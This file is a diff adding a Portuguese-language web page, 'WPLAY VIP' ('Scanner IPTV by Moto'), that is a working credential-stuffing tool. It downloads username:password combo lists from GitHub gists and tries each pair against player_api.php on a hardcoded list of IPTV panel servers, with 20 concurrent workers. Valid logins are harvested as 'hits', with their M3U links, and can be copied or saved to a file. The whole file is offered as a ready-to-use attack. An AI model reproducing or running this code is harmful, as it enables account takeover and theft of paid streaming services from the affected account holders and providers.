@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>WPLAY VIP</title>
+  <style>
+    body {
+      background: #0a0a0a url('https://i.ytimg.com/vi/yj04H8DnxMs/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGBEgcigvMA8=&rs=AOn4CLDx5ZB3ZIyYl4PNJVNcFg-ESRUAeg') no-repeat center center fixed;
+      background-size: cover;
+      background-blend-mode: overlay;
+      color: #39FF14;
+      font-family: 'Courier New', Courier, monospace;
+      padding: 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      position: relative;
+    }
+    
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(10, 10, 10, 0.7);
+      z-index: -1;
+    }
+    
+    .header-text {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #39FF14;
+      font-size: 2.8em;
+      font-weight: 900;
+      text-shadow: 0 0 20px #39FF14, 0 0 40px #39FF14;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+    }
+    
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 15px #39FF14, 0 0 30px #39FF14;
+      font-weight: 900;
+      font-size: 2.2em;
+      color: #39FF14;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 10px;
+      color: #39FF14;
+    }
+    input[type=text], input[type=file], select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      background: #1a1a1a;
+      border: 2px solid #39FF14;
+      color: #39FF14;
+      font-size: 16px;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    input[type=text]:focus, select:focus {
+      outline: none;
+      border-color: #39FF14;
+      box-shadow: 0 0 10px #39FF14;
+    }
+    button {
+      margin-top: 15px;
+      padding: 14px 20px;
+      font-size: 20px;
+      background: #39FF14;
+      color: #0a0a0a;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      font-weight: 700;
+      box-shadow: 0 0 15px #39FF14;
+    }
+    button:disabled {
+      background: #006600;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    button:hover:not(:disabled) {
+      background: #39FF14;
+      box-shadow: 0 0 25px #39FF14;
+      transform: translateY(-2px);
+    }
+    
+    /* Estilo especial para o botão unificado */
+    #unifiedBtn {
+      background: linear-gradient(45deg, #39FF14, #39FF14, #39FF14);
+      background-size: 300% 300%;
+      animation: gradientShift 3s ease infinite;
+      color: #0a0a0a;
+      font-size: 22px;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 0 25px #39FF1455;
+      border: 2px solid #39FF14;
+    }
+    
+    #unifiedBtn:hover:not(:disabled) {
+      transform: translateY(-3px);
+      box-shadow: 0 0 35px #39FF14;
+    }
+    
+    #unifiedBtn:disabled {
+      background: #006600;
+      animation: none;
+      color: #666;
+    }
+    
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      text-align: center;
+      font-weight: 700;
+      color: #39FF14;
+      text-shadow: 0 0 10px #39FF14;
+    }
+    #hits {
+      margin-top: 20px;
+      flex-grow: 1;
+      max-height: 50vh;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #39FF14 transparent;
+    }
+    #hits::-webkit-scrollbar {
+      width: 8px;
+    }
+    #hits::-webkit-scrollbar-thumb {
+      background-color: #39FF14;
+      border-radius: 4px;
+    }
+    .hit-card {
+      background: #003300;
+      border: 2px solid #39FF14;
+      border-radius: 10px;
+      padding: 18px 18px 50px 18px;
+      margin-bottom: 14px;
+      box-shadow: 0 0 20px #39FF1455;
+      line-height: 1.6em;
+      font-size: 16px;
+      position: relative;
+      word-break: break-word;
+    }
+    .hit-title {
+      font-size: 1.3em;
+      font-weight: 900;
+      color: #39FF14;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #39FF14;
+    }
+    .copy-btn {
+      position: absolute;
+      bottom: 12px;
+      right: 12px;
+      background: #39FF14;
+      color: #0a0a0a;
+      border: none;
+      border-radius: 6px;
+      padding: 6px 10px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px #39FF14;
+    }
+    .copy-btn:hover {
+      background: #39FF14;
+      box-shadow: 0 0 15px #39FF14;
+    }
+    #copyAllBtn {
+      background: #39FF14;
+      color: #0a0a0a;
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      box-shadow: 0 0 15px #39FF14;
+    }
+    #copyAllBtn:hover {
+      background: #39FF14;
+      box-shadow: 0 0 25px #39FF14;
+    }
+    #saveHitsBtn {
+      background: #ff6b35;
+      color: #0a0a0a;
+      margin-top: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      box-shadow: 0 0 15px #ff6b35;
+    }
+    #saveHitsBtn:hover:not(:disabled) {
+      background: #e55a2b;
+      box-shadow: 0 0 25px #ff6b35;
+    }
+    #saveHitsBtn:disabled {
+      background: #663317;
+      color: #666;
+    }
+    
+    /* Animação para o texto do cabeçalho */
+    @keyframes neonGlow {
+      0%, 100% {
+        text-shadow: 0 0 20px #39FF14, 0 0 40px #39FF14, 0 0 60px #39FF14;
+      }
+      50% {
+        text-shadow: 0 0 10px #39FF14, 0 0 20px #39FF14, 0 0 30px #39FF14;
+      }
+    }
+    
+    .header-text {
+      animation: neonGlow 2s ease-in-out infinite;
+    }
+
+    .unified-status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #39FF14;
+      text-align: center;
+      min-height: 20px;
+    }
+
+    #slideImg {
+      width: 100%;
+      max-width: 100%;
+      aspect-ratio: 16/5;
+      object-fit: cover;
+      border-radius: 12px;
+      margin-bottom: 15px;
+      display: block;
+      border: 2px solid #39FF14;
+      box-shadow: 0 0 20px #39FF1455;
+    }
+  </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Texto personalizado substituindo o logo -->
+        <div class="header-text">
+            WPLAY VIP
+        </div>
+        
+        <img id="slideImg" src="" alt="slide">
+        
+  <h1>WPLAY VIP</h1>
+
+  <!-- Seção Servidor IPTV oculta - servidor selecionado automaticamente -->
+
+  <!-- Quantidade de bots fixada em 20 (oculta) -->
+
+  <button id="unifiedBtn">🚀 INICIAR 🚀</button>
+  <div id="unifiedStatus" class="unified-status"></div>
+  
+  <button id="stopBtn" disabled>Parar Scan</button>
+
+  <div id="status">Status: Parado | Hits: 0 | Falhas: 0</div>
+
+  <button id="copyAllBtn" style="display:none;">Copiar Todos os Hits</button>
+  <button id="saveHitsBtn" style="display:none;">Salvar Hits em Arquivo TXT</button>
+  <div id="hits"></div>
+
+<script>
+(() => {
+  // Criar input oculto para o panel
+  const panelInput = document.createElement('input');
+  panelInput.type = 'hidden';
+  panelInput.id = 'panel';
+  document.body.appendChild(panelInput);
+  
+  const unifiedBtn = document.getElementById('unifiedBtn');
+  const unifiedStatus = document.getElementById('unifiedStatus');
+  const stopBtn = document.getElementById('stopBtn');
+  const statusDiv = document.getElementById('status');
+  const hitsDiv = document.getElementById('hits');
+  const copyAllBtn = document.getElementById('copyAllBtn');
+  const saveHitsBtn = document.getElementById('saveHitsBtn');
+
+  let combos = [];
+  let running = false;
+  let hits = [];
+  let fails = 0;
+  let currentIndex = 0;
+  let concurrency = 20; // Fixado em 20 bots
+
+  // URL do arquivo combo no GitHub
+  const COMBO_URL = 'https://gist.githubusercontent.com/negrete79/28c31c0673bd32c78439f490e4ca678d/raw/';
+'https://gist.githubusercontent.com/negrete79/3f52a27d0bc52fc90f1429e43f812919/raw/';
+
+  // Links de servidores IPTV
+  const IPTV_SERVERS = [
+    'http://flayto.click',
+    'http://klog34yrtjrt678we4gdrh4563t6terh.hyperedge.sbs',
+    'http://vis.blue',
+    'http://turbocdn.sbs',
+    'http://cdnn.fans',
+    'http://warez.red',
+    'http://knie.fans',
+    'http://kplay.red',
+    'http://peercast.sbs',
+    'http://volskraks.com:80',
+    'http://jggjnfhd.com:80',
+    'http://hdsviska.com:80',
+    'http://verg45y90hhn7mngn65y0bf5489vxvb.streamcdn.sbs',
+    'http://globoplay.one'
+  ];
+
+  function sanitizePanel(input) {
+    input = input.trim();
+    return input.replace(/^https?:\/\//, '');
+  }
+
+  // Função para selecionar um servidor IPTV aleatoriamente
+  function selectRandomIptvServer() {
+    const randomIndex = Math.floor(Math.random() * IPTV_SERVERS.length);
+    const selectedServer = IPTV_SERVERS[randomIndex];
+    panelInput.value = selectedServer;
+    return selectedServer;
+  }
+
+  // Função para carregar o arquivo combo do GitHub
+  async function loadComboFromGitHub() {
+    try {
+      unifiedStatus.textContent = '📥 Baixando arquivo combo...';
+      unifiedStatus.style.color = '#39FF14';
+
+      const response = await fetch(COMBO_URL);
+      if (!response.ok) {
+        throw new Error(`Erro HTTP: ${response.status}`);
+      }
+
+      const text = await response.text();
+      combos = text.split(/\r?\n/).filter(l => l.includes(':'));
+      
+      if (combos.length === 0) {
+        throw new Error('Nenhum combo válido encontrado no arquivo');
+      }
+
+      unifiedStatus.textContent = `✅ Arquivo carregado! ${combos.length} combos encontrados.`;
+      unifiedStatus.style.color = '#39FF14';
+      return true;
+
+    } catch (error) {
+      unifiedStatus.textContent = `❌ Erro ao carregar arquivo: ${error.message}`;
+      unifiedStatus.style.color = '#ff4444';
+      combos = [];
+      return false;
+    }
+  }
+
+  // Função unificada que executa todas as três operações
+  async function executeUnifiedScan() {
+    if (running) return;
+
+    try {
+      unifiedBtn.disabled = true;
+      unifiedBtn.textContent = '⏳ PREPARANDO SCAN...';
+      
+      // Passo 1: Selecionar servidor aleatório
+      unifiedStatus.textContent = '🎲 Selecionando servidor aleatório...';
+      unifiedStatus.style.color = '#39FF14';
+      const selectedServer = selectRandomIptvServer();
+      
+      // Aguardar um pouco para mostrar o progresso
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      
+      unifiedStatus.textContent = `🎯 Servidor selecionado: ${selectedServer}`;
+      
+      // Passo 2: Carregar combos
+      await new Promise(resolve => setTimeout(resolve, 500));
+      const comboLoaded = await loadComboFromGitHub();
+      
+      if (!comboLoaded) {
+        throw new Error('Falha ao carregar arquivo combo');
+      }
+      
+      // Passo 3: Iniciar scan
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      unifiedStatus.textContent = '🚀 Iniciando scan...';
+      unifiedStatus.style.color = '#39FF14';
+      
+      // Inicializar variáveis do scan
+      running = true;
+      currentIndex = 0;
+      hits = [];
+      fails = 0;
+      hitsDiv.innerHTML = '';
+      statusDiv.textContent = 'Status: Iniciando Scan | Hits: 0 | Falhas: 0';
+      stopBtn.disabled = false;
+      copyAllBtn.style.display = 'none';
+      saveHitsBtn.style.display = 'none';
+      // concurrency já está fixado em 20
+      
+      unifiedBtn.textContent = '✅ SCAN EM EXECUÇÃO';
+      unifiedStatus.textContent = '⚡ Escaneando combos...';
+      
+      // Iniciar o processo de scan
+      scanNext();
+      
+    } catch (error) {
+      unifiedStatus.textContent = `❌ Erro: ${error.message}`;
+      unifiedStatus.style.color = '#ff4444';
+      unifiedBtn.disabled = false;
+      unifiedBtn.textContent = '🚀 INICIAR SCAN 🚀';
+    }
+  }
+
+  // Event listener para o botão unificado
+  unifiedBtn.addEventListener('click', executeUnifiedScan);
+
+  stopBtn.addEventListener('click', () => {
+    running = false;
+    statusDiv.textContent = `Status: Parado | Hits: ${hits.length} | Falhas: ${fails}`;
+    unifiedBtn.disabled = false;
+    unifiedBtn.textContent = '🚀 INICIAR SCAN 🚀';
+    unifiedStatus.textContent = '⏹️ Scan interrompido pelo usuário';
+    unifiedStatus.style.color = '#39FF14';
+    stopBtn.disabled = true;
+  });
+
+  function copyTextToClipboard(text) {
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Hits Copiados com Sucesso!");
+      }).catch(() => {
+        fallbackCopy(text);
+      });
+    } else {
+      fallbackCopy(text);
+    }
+  }
+
+  function fallbackCopy(text) {
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    textarea.style.position = "fixed";
+    textarea.style.opacity = 0;
+    document.body.appendChild(textarea);
+    textarea.focus();
+    textarea.select();
+    try {
+      document.execCommand('copy');
+      alert("Hits Copiados com Sucesso!");
+    } catch {
+      alert("Erro ao Copiar! Pressione e Segure para Copiar Manualmente.");
+    }
+    document.body.removeChild(textarea);
+  }
+
+  // Função para salvar hits em arquivo TXT
+  function saveHitsToFile() {
+    if (!hits.length) {
+      alert("Nenhum hit encontrado para salvar!");
+      return;
+    }
+
+    const texto = hits.map(hit => 
+`Scanner IPTV by Moto
+Servidor: http://${hit.painel}
+Usuário: ${hit.usuario}
+Senha: ${hit.senha}
+Expira: ${hit.exp || 'sim'}
+Conexões: ${hit.active_cons || '?'}
+-----------------------------
+Lista M3U: ${hit.m3u}
+-----------------------------`
+    ).join('\n\n');
+
+    // Criar elemento de download
+    const blob = new Blob([texto], { type: 'text/plain;charset=utf-8' });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    
+    // Nome do arquivo com data e hora
+    const now = new Date();
+    const timestamp = now.toISOString().slice(0, 19).replace(/[T:]/g, '-');
+    a.download = `hits_iptv_${timestamp}.txt`;
+    
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    window.URL.revokeObjectURL(url);
+    
+    alert(`Arquivo salvo com sucesso! ${hits.length} hits salvos.`);
+  }
+
+  copyAllBtn.addEventListener('click', () => {
+    if (!hits.length) return;
+    const texto = hits.map(hit => 
+`Scanner IPTV by Moto\nServidor: http://${hit.painel}\nUsuário: ${hit.usuario}\nSenha: ${hit.senha}\nExpira: ${hit.exp || 'sim'}\nConexões: ${hit.active_cons || '?'}\n-----------------------------\nLista M3U: ${hit.m3u}\n-----------------------------`
+    ).join('\n\n');
+    copyTextToClipboard(texto);
+  });
+
+  // Event listener para o botão de salvar hits
+  saveHitsBtn.addEventListener('click', saveHitsToFile);
+
+  function addHit(hit) {
+    hits.push(hit);
+    const card = document.createElement('div');
+    card.className = 'hit-card';
+    const texto = `Scanner IPTV by Moto\nServidor: http://${hit.painel}\nUsuário: ${hit.usuario}\nSenha: ${hit.senha}\nExpira: ${hit.exp || 'sim'}\nConexões: ${hit.active_cons || '?'}\n-----------------------------\nLista M3U: ${hit.m3u}\n-----------------------------`
+
+    card.innerHTML = `
+      <div class="hit-title">HIT ENCONTRADO!</div>
+      ${texto.replace(/\n/g, '<br>')}
+      <br><br>
+      <button class="copy-btn">Copiar</button>
+    `;
+
+    card.querySelector('.copy-btn').addEventListener('click', () => {
+      copyTextToClipboard(texto);
+    });
+
+    hitsDiv.appendChild(card);
+    updateStatus();
+    copyAllBtn.style.display = 'block';
+    saveHitsBtn.style.display = 'block';
+  }
+
+  async function checkCombo(panel, usuario, senha) {
+    try {
+      // Construir URL para API
+      const urlBase = `http://${panel}/player_api.php?username=${encodeURIComponent(usuario)}&password=${encodeURIComponent(senha)}&type=m3u`;
+
+      let fetchUrl = urlBase;
+
+      const response = await fetch(fetchUrl, {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        },
+        signal: AbortSignal.timeout(10000)
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}`);
+      }
+
+      const text = await response.text();
+
+      // Verificar se é uma resposta válida de IPTV
+      if (text.includes('#EXTM3U') || text.includes('user_info') || text.includes('server_info')) {
+        // Tentar obter informações do usuário
+        const userInfoUrl = `http://${panel}/player_api.php?username=${encodeURIComponent(usuario)}&password=${encodeURIComponent(senha)}&action=get_user_info`;
+        
+        try {
+          const userResponse = await fetch(userInfoUrl, {
+            method: 'GET',
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            },
+            signal: AbortSignal.timeout(5000)
+          });
+
+          let userInfo = {};
+          if (userResponse.ok) {
+            const userText = await userResponse.text();
+            try {
+              userInfo = JSON.parse(userText);
+            } catch {}
+          }
+
+          const hit = {
+            painel: panel,
+            usuario: usuario,
+            senha: senha,
+            m3u: urlBase,
+            exp: userInfo.exp_date || 'sim',
+            active_cons: userInfo.active_cons || '?'
+          };
+
+          addHit(hit);
+          return true;
+        } catch {
+          // Se falhar ao obter user info, ainda considera como hit
+          const hit = {
+            painel: panel,
+            usuario: usuario,
+            senha: senha,
+            m3u: urlBase,
+            exp: 'sim',
+            active_cons: '?'
+          };
+
+          addHit(hit);
+          return true;
+        }
+      } else {
+        return false;
+      }
+    } catch (error) {
+      return false;
+    }
+  }
+
+  function updateStatus() {
+    statusDiv.textContent = `Status: ${running ? 'Escaneando' : 'Parado'} | Hits: ${hits.length} | Falhas: ${fails} | Progresso: ${currentIndex}/${combos.length}`;
+    
+    if (running && hits.length > 0) {
+      unifiedStatus.textContent = `🎯 ${hits.length} hits encontrados!`;
+      unifiedStatus.style.color = '#39FF14';
+    }
+  }
+
+  async function scanNext() {
+    if (!running) return;
+
+    const workers = [];
+    const batchSize = Math.min(concurrency, combos.length - currentIndex);
+
+    for (let i = 0; i < batchSize && currentIndex < combos.length; i++) {
+      const combo = combos[currentIndex++];
+      const [usuario, senha] = combo.split(':');
+      const panel = sanitizePanel(panelInput.value);
+
+      workers.push(
+        checkCombo(panel, usuario, senha).then(success => {
+          if (!success) fails++;
+          updateStatus();
+        }).catch(() => {
+          fails++;
+          updateStatus();
+        })
+      );
+    }
+
+    if (workers.length > 0) {
+      await Promise.all(workers);
+      
+      if (running && currentIndex < combos.length) {
+        setTimeout(scanNext, 100);
+      } else if (running) {
+        // Scan concluído
+        running = false;
+        unifiedBtn.disabled = false;
+        unifiedBtn.textContent = '🚀 INICIAR SCAN COMPLETO 🚀';
+        unifiedStatus.textContent = `✅ Scan concluído! ${hits.length} hits encontrados.`;
+        unifiedStatus.style.color = '#39FF14';
+        stopBtn.disabled = true;
+        statusDiv.textContent = `Status: Concluído | Hits: ${hits.length} | Falhas: ${fails}`;
+      }
+    }
+  }
+
+  // Slide de imagens
+  const slides = [
+    "https://i.ytimg.com/vi/yj04H8DnxMs/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGBEgcigvMA8=&rs=AOn4CLDx5ZB3ZIyYl4PNJVNcFg-ESRUAeg",
+    "https://i.ytimg.com/vi/yj04H8DnxMs/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGBEgcigvMA8=&rs=AOn4CLDx5ZB3ZIyYl4PNJVNcFg-ESRUAeg",
+    "https://i.ytimg.com/vi/yj04H8DnxMs/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGBEgcigvMA8=&rs=AOn4CLDx5ZB3ZIyYl4PNJVNcFg-ESRUAeg"
+  ];
+  let slideIndex = 0;
+  setInterval(() => {
+    document.getElementById("slideImg").src = slides[slideIndex];
+    slideIndex = (slideIndex + 1) % slides.length;
+  }, 4000);
+})();
+</script>
+</body>
+</html>
+
